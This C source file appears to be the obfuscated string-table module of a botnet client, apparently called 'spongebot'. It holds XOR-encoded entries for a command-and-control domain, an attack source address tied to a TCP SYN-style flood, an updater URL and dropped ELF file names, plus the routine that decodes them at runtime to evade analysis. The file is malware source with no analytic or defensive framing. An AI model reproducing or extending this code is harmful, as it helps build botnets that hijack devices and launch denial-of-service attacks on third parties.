#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <dict.h>

#define XOR_KEY 0x87f08f33U

struct dict_item dict[DICT_MAX_ITEMS];

void dict_init(void)
{
    for (int i = 0; i < DICT_MAX_ITEMS; i++)
    {
        dict[i].value = NULL;
        dict[i].value_len = 0;
    }

    dict_add(DICT_DOMAIN_NAME, "\x02\xBD\xC7\xA9\x03\xA1\xC0\xA9\x02");                          // domain name
    dict_add(DICT_SERVER_HELLO, "\x7B\xEA\x9C\xEB\x5C\xAF\xBD\xF5\x1D\xAF\xBB\xF5\x52\xED\x83"); // example: hello server

    // TCP ESSYN
    dict_add(ATK_LOCAL_ADDR, "\x02\xB6\xC2\xA9\x02\xB9\xC8\xA9"); // default: 192.168.3.100

    // http://localhost:3000/version/get
    dict_add(UPDATER_URL, "\x5B\xFB\x84\xF7\x09\xA0\xDF\xEB\x5C\xEC\x91\xEB\x5B\xE0\x83\xF3\x09\xBC\xC0\xB7\x03\xA0\x86\xE2\x41\xFC\x99\xE8\x5D\xA0\x97\xE2\x47");
    dict_add(UPDATER_TMP_FILE, "\x40\xFF\x9F\xE9\x54\xEA\x92\xE8\x47");                                         // es: spongebot (elf)
    dict_add(UPDATER_VER_FILE, "\x50\xFA\x82\xF5\x56\xE1\x84\xD8\x45\xEA\x82\xF4\x5A\xE0\x9E\xA9\x47\xF7\x84"); // current_version.txt
}

void xor_encrypt_decrypt(char *data, size_t len, uint32_t key)
{
    uint8_t keys[4] = {
        key & 0xFF,
        (key >> 8) & 0xFF,
        (key >> 16) & 0xFF,
        (key >> 24) & 0xFF};

    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= keys[i % 4];
    }
}

void dict_add(int index, const char *value)
{
    if (index < 0 || index >= DICT_MAX_ITEMS)
    {
#ifdef DEBUG
        printf("[dictionary]: Index out of range!\n");
#endif
        return;
    }

    if (dict[index].value != NULL)
    {
        free(dict[index].value);
    }

    size_t value_len = strlen(value);
    dict[index].value_len = value_len;
    dict[index].value = (char *)malloc(value_len + 1);

    if (!dict[index].value)
    {
#ifdef DEBUG
        printf("[dictionary] Error during memory allocation!\n");
#endif
        return;
    }

    memcpy(dict[index].value, value, value_len + 1);
}

char *dict_get(int index)
{
    if (index < 0 || index >= DICT_MAX_ITEMS || dict[index].value == NULL)
    {
        return NULL;
    }

    char *decrypted_value = (char *)malloc(dict[index].value_len + 1);
    if (decrypted_value == NULL)
    {
#ifdef DEBUG
        printf("[dictionary] Error during memory allocation\n");
#endif
        return NULL;
    }

    memcpy(decrypted_value, dict[index].value, dict[index].value_len + 1);

    xor_encrypt_decrypt(decrypted_value, dict[index].value_len, XOR_KEY);

    return decrypted_value;
}

void dict_free(void)
{
    for (int i = 0; i < DICT_MAX_ITEMS; i++)
    {
        if (dict[i].value)
        {
            free(dict[i].value);
            dict[i].value = NULL;
        }
    }
}

void dict_init(void);
void xor_encrypt_decrypt(char *data, size_t len, uint32_t key);
void dict_add(int index, const char *value);
char *dict_get(int index);
void dict_free(void);